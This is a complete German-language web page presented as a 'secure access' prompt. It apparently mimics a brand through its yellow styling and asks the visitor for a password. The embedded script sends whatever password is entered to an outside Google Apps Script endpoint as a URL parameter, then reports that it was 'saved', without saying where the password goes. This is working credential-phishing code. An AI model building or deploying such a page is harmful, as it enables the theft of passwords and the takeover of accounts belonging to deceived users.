<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Zugang sichern</title>
  <style>
    body {
      font-family: 'Segoe UI', sans-serif;
      background-color: #f8f8f8;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }

    .container {
      background: white;
      padding: 2rem;
      border-radius: 16px;
      box-shadow: 0 8px 24px rgba(0,0,0,0.1);
      width: 90%;
      max-width: 400px;
      text-align: center;
    }

    h1 {
      color: #fffc00;
      font-size: 1.8rem;
    }

    input {
      width: 100%;
      padding: 0.8rem;
      margin-top: 1rem;
      font-size: 1rem;
      border: 1px solid #ccc;
      border-radius: 8px;
    }

    button {
      margin-top: 1rem;
      padding: 0.8rem 1.2rem;
      background-color: #fffc00;
      border: none;
      font-weight: bold;
      cursor: pointer;
      border-radius: 8px;
      transition: 0.2s;
    }

    button:hover {
      background-color: #f2f200;
    }

    .message {
      margin-top: 1rem;
      font-size: 1rem;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>üîê Zugang sichern</h1>
    <input type="password" id="pw" placeholder="Passwort eingeben" />
    <button onclick="submitPassword()">Absenden</button>
    <div id="msg" class="message"></div>
  </div>

  <script>
    function submitPassword() {
      const pw = document.getElementById("pw").value;
      const msg = document.getElementById("msg");

      const url = "https://script.google.com/macros/s/AKfycbx4VOClu70N3wzvVnPQrHg7bYRkl9VpZUTOwcbdZKvxtDE-poCyN8z_T_xO9_hnyojY/exec?password=" + encodeURIComponent(pw);

      fetch(url)
        .then(res => res.text())
        .then(data => {
          msg.innerHTML = "‚úÖ Gespeichert!";
          document.getElementById("pw").value = "";
        })
        .catch(err => {
          msg.innerHTML = "‚ùå Fehler beim Senden.";
          console.error(err);
        });
    }
  </script>
</body>
</html>
